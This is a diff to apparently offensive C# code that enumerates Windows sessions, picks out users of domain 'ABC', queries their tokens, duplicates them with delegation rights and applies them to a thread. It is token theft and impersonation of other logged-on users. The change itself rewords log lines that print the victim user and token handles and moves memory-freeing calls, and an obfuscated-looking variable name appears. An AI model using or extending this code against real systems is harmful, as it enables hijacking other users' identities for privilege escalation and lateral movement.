@@ -203,10 +203,6 @@
 
 								Console.WriteLine("Domain and User: " + Marshal.PtrToStringAnsi(domainPtr) + "\\" + Marshal.PtrToStringAnsi(userPtr));
 
-								WTSFreeMemory(userPtr);
-								WTSFreeMemory(domainPtr);
-
-
 								IntPtr currentToken = new IntPtr();
 								int bRet = WTSQueryUserToken((UInt32)si.SessionID, out currentToken);
 
@@ -215,8 +211,8 @@
 								string domain_name = "ABC";
 								
 								if(Marshal.PtrToStringAnsi(domainPtr) == domain_name){
-									Console.WriteLine("User Found: "+System.Security.Principal.WindowsIdentity.GetCurrent().Name);
-									Console.WriteLine(string.Format("User Token: {0}", currentToken));
+									Console.WriteLine("User Found: "+Marshal.PtrToStringAnsi(userPtr));
+									Console.WriteLine(string.Format("Token before impersonation: {0}", currentToken));
 	 
 									SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
 									sa.bInheritHandle = true;
@@ -226,7 +222,7 @@
 									uint MAXIMUM_ALLOWED = (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate | TokenAccessLevels.Impersonate);
 									IntPtr dupTokenHandle = new IntPtr();
 									bool dupReturnValue = DuplicateTokenEx(currentToken, MAXIMUM_ALLOWED, ref sa, (int)SecurityImpersonationLevel.SecurityDelegation, (int)TokenType.TokenImpersonation, ref dupTokenHandle);
-									Console.WriteLine(string.Format("Token p: {0}", dupTokenHandle));
+									Console.WriteLine(string.Format("Token generated via impersonation: {0}", dupTokenHandle));
 									
 									
 									
@@ -241,6 +237,8 @@
 									SetThreadToken(ref DYtvdEXCykZ, dupTokenHandle);
 									WaitForSingleObject(DYtvdEXCykZ, 0xFFFFFFFF);
 								}
+								WTSFreeMemory(userPtr);
+								WTSFreeMemory(domainPtr);
 							}
 
 							WTSFreeMemory(SessionInfoPtr);
